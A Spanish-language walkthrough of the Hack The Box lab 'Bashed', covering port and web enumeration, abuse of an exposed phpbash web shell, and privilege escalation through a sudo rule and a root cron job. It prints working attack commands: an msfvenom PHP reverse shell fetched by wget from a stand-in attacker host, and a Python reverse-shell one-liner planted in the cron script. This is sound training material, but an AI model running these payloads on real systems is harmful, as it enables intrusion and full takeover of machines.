---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - ReverseShell
  - Cron
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del sistema|Enumeración del sistema]]
	- [[#Enumeración#Enumeración de puertos|Enumeración de puertos]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Cron Job|Cron Job]]
	- [[#Escalada de Privilegios#Sudo Misconfiguration|Sudo Misconfiguration]]
	- [[#Escalada de Privilegios#Cron Job Exploitation|Cron Job Exploitation]]

---
# Bashed

![](Screenshots/Pasted%20image%2020260502091204.png)

>Máquina de Hack The Box llamada **[Bashed](https://app.hackthebox.com/machines/Bashed)**, centrada en la explotación de una web vulnerable que expone una web shell en PHP, permitiendo ejecución remota de comandos.  
>La intrusión comienza con la enumeración del servicio HTTP, donde se identifica el uso de **phpbash**, una herramienta que permite ejecutar comandos directamente desde el navegador. Esto facilita la obtención de acceso inicial como `www-data`.  
>Durante la fase de post-explotación, se identifican tareas programadas (cron jobs) ejecutadas como root, junto con permisos sudo que permiten cambiar al usuario `scriptmanager`.  
>Finalmente, modificando un script ejecutado por cron, se consigue ejecución de código como root, comprometiendo completamente el sistema.

---
## Enumeración
### Enumeración del sistema

```PowerShell
ping -c 1 10.129.30.120
PING 10.129.30.120 (10.129.30.120) 56(84) bytes of data.
64 bytes from 10.129.30.120: icmp_seq=1 ttl=63 time=46.0 ms

--- 10.129.30.120 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 46.029/46.029/46.029/0.000 ms
```

El TTL de `63` (típico en redes Linux con decremento de 1 salto) sugiere que el sistema objetivo es Linux.
### Enumeración de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.30.120 -oG allPorts
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

```PowerShell
nmap -p80 -sCV 10.129.30.120 -oN targeted
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Puertos descubiertos:
- `80 → HTTP`
### HTTP

```HTTP
http://10.129.30.120/
```

![](Screenshots/Pasted%20image%2020260502091626.png)

Se identifica que la aplicación utiliza **[phpbash](https://github.com/Arrexel/phpbash)**, una web shell escrita en PHP que permite ejecutar comandos directamente desde el navegador.  
  
Esto representa un vector crítico, ya que elimina la necesidad de explotar una vulnerabilidad tradicional: el acceso remoto ya está disponible.
#### Fuzzing Web

```PowerShell
gobuster dir -u http://10.129.30.120/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 64
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
uploads              (Status: 301) [Size: 316] [--> http://10.129.30.120/uploads/]
php                  (Status: 301) [Size: 312] [--> http://10.129.30.120/php/]
css                  (Status: 301) [Size: 312] [--> http://10.129.30.120/css/]
dev                  (Status: 301) [Size: 312] [--> http://10.129.30.120/dev/]
js                   (Status: 301) [Size: 311] [--> http://10.129.30.120/js/]
images               (Status: 301) [Size: 315] [--> http://10.129.30.120/images/]
fonts                (Status: 301) [Size: 314] [--> http://10.129.30.120/fonts/]
server-status        (Status: 403) [Size: 301]
demo-images          (Status: 301) [Size: 320] [--> http://10.129.30.120/demo-images/]
Progress: 1273830 / 1273830 (100.00%)
```

---
## Explotación
### Reverse Shell

Aunque **phpbash** permite ejecutar comandos, no proporciona una shell interactiva estable, por lo que se sube una reverse shell para mejorar el acceso.

Se crea una *reverse shell* mediante `msfvenom`.

Máquina atacante:

```PowerShell
msfvenom -p php/reverse_php LHOST=[ATTACKER_IP] LPORT=1234 -f raw > reverse.php
python -m http.server 80
```

Máquina victima:

```PowerShell
cd ..
cd uploads
wget http://[ATTACKER_IP]:80/reverse.php
```

Ahora que tenemos la *reverse shell* subida a la máquina víctima.

Máquina atacante:

```PowerShell
nc -nlvp 1234
```

Máquina victima:

```HTTP
http://10.129.30.120/uploads/reverse.php
```

Se obtiene una *reverse shell* con el usuario `www-data`.

Se realiza otra *reverse shell* para no tener problemas de conexión, además de realizar un tratamiento de terminal.

```PowerShell
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

La flag de `usuario` se encuentra en: `/home/arrexel`.

---
## Escalada de Privilegios
### Cron Job

Se utiliza [pspy](https://github.com/DominicBreuker/pspy) para monitorizar procesos en ejecución sin privilegios, con el objetivo de identificar tareas programadas (cron jobs) ejecutadas como root.

Máquina atacante:

```PowerShell
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python -m http.server 80
```

Máquina victima:

```PowerShell
cd /tmp
wget http://[ATTACKER_IP]:80/pspy64
chmod +x pspy64
./pspy64
2026/05/02 01:21:35 CMD: UID=0     PID=1      | /sbin/init noprompt 
2026/05/02 01:22:01 CMD: UID=0     PID=2235   | /usr/sbin/CRON -f 
2026/05/02 01:22:01 CMD: UID=0     PID=2236   | /usr/sbin/CRON -f 
2026/05/02 01:22:01 CMD: UID=0     PID=2237   | python test.py 
2026/05/02 01:23:01 CMD: UID=0     PID=2238   | /usr/sbin/CRON -f 
2026/05/02 01:23:01 CMD: UID=0     PID=2239   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2026/05/02 01:23:01 CMD: UID=0     PID=2240   | python test.py 
2026/05/02 01:24:01 CMD: UID=0     PID=2241   | /usr/sbin/CRON -f 
2026/05/02 01:24:01 CMD: UID=0     PID=2242   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2026/05/02 01:24:01 CMD: UID=0     PID=2243   | python test.py

find / -name test.py 2>/dev/null
/scripts/test.py
cd /
ls -la
drwxrwxr--   2 scriptmanager scriptmanager  4096 May  2 01:39 scripts
```

Se identifica un cron job crítico que ejecuta todos los scripts `.py` dentro del directorio `/scripts` como root.  
  
Esto implica que cualquier script en esa ruta será ejecutado con privilegios elevados.
### Sudo Misconfiguration

```PowerShell
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

El usuario `www-data` puede ejecutar cualquier comando como `scriptmanager` sin contraseña, lo que permite pivotar a este usuario.

Para poder tener una *bash* con el usuario `scriptmanager`.

```PowerShell
sudo -u scriptmanager bash -i
```

Ahora, podemos acceder al directorio `/scripts`.
### Cron Job Exploitation

Dado que el cron ejecuta scripts Python como root y el usuario `scriptmanager` tiene permisos de escritura en el directorio `/scripts`, es posible modificar uno de estos scripts para ejecutar código arbitrario como root.

Se encuentran dos archivos `test.py` y `test.txt`.

```PowerShell
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

cat test.txt
testing 123!

ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 May  2 01:29 test.txt
```

Al poder reescribir el archivo `test.py`, se realiza una *reverse shell* con `Python`.

Máquina atacante:

```PowerShell
nc -nlvp 9000
```

Máquina víctima:

```PowerShell
nano test.py
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ATTACKER_IP]",9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh");
```

Se obtiene una consola interactiva con `root`.

La flag de `root` se encuentra en: `/root`.

---